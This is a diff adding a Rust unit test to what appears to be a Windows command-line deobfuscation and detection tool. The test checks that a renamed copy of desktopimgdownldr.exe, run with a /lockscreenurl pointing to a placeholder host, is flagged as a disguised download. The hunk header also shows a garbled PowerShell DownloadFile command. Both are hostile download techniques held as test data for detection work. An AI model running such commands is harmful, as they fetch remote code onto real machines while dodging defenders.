@@ -33101,6 +33101,55 @@ powershll.exe -mmand"(Nw-ject-ypame Sstem.Net.Welint).Dwnloadile('https://raw.ex
     }
 
     #[test]
+    fn copied_desktopimgdownldr_alias_in_deob_text_emits_lockscreen_download() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        env.traits.push(Trait::WindowsUtilManip {
+            cmd: r#"copy C:\Windows\System32\desktopimgdownldr.exe C:\Users\Public\img.tmp"#
+                .to_string(),
+            src: r#"C:\Windows\System32\desktopimgdownldr.exe"#.to_string(),
+            dst: r#"C:\Users\Public\img.tmp"#.to_string(),
+        });
+        crate::deob_scan::scan_deob_text(
+            r#"C:\Users\Public\img.tmp /lockscreenurl:https://copied-desktopimg.example/a.jpg /eventName:test"#,
+            &mut env,
+        );
+        assert!(
+            env.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::ManipulatedExec { target, .. }
+                        if target == r#"C:\Users\Public\img.tmp"#
+                )
+            }),
+            "copied desktopimgdownldr alias did not emit manipulated execution: {:?}",
+            env.traits
+        );
+        assert!(
+            env.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { cmd, src, dst: None }
+                        if cmd == "desktopimgdownldr.exe /lockscreenurl:https://copied-desktopimg.example/a.jpg /eventName:test"
+                            && src == "https://copied-desktopimg.example/a.jpg"
+                )
+            }),
+            "copied desktopimgdownldr alias did not replay lockscreen download: {:?}",
+            env.traits
+        );
+        assert!(
+            !env.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::DownloadInDeobText { src, .. }
+                        if src == "https://copied-desktopimg.example/a.jpg"
+                )
+            }),
+            "copied desktopimgdownldr URL double-emitted as generic: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn copied_msiexec_alias_in_deob_text_emits_package_url_argument() {
         let mut env = crate::env::Environment::new(&Config::default());
         env.traits.push(Trait::WindowsUtilManip {
